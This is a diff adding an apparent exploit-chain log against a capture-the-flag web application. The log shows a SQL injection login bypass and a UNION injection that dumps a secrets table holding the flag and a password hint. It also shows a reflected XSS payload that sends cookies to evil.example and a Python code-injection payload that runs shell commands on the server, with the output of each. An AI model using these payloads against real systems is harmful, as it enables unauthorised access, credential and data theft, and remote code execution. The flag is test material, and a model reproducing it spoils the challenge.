@@ -1,0 +1,23 @@
+
+[1] SQLi auth bypass on /login
+  POST /login  username="admin'--"  password='x'
+  -> HTTP 302  sess=cfd6495aa9bb0a435afe5dbeb1bbe0af; Path=/  Location: /admin
+
+[2] Admin panel via hijacked session
+  -> flag (auth path): CTF{sql1_xss_rce_ch41n_pwn3d}
+
+[3] UNION SQLi on /search (no auth needed)
+  -> payload: ' UNION SELECT value FROM secrets WHERE name='flag' --
+  -> leaked row  : CTF{sql1_xss_rce_ch41n_pwn3d}
+  -> table leak   : 3 row(s) -> ['CTF{sql1_xss_rce_ch41n_pwn3d}', 'admin hint: password is S3cr3t!', 'welcome to the intranet']
+
+[4] Reflected XSS on /search
+  -> payload: <script>document.location="http://evil.example/steal?c="+document.cook...
+  -> reflected unescaped: True
+  -> in a real browser this JS runs in the victim's session (cookie steal)
+
+[5] Code injection RCE on /calc
+  -> payload: __import__('os').popen('id && whoami').read()
+  -> server output: uid=1001(runner) gid=1001(runner) groups=1001(runner),4(adm),100(users),118(docker),999(systemd-journal)\nrunner\n
+
+[+] pwned: auth bypass + data theft + XSS + RCE
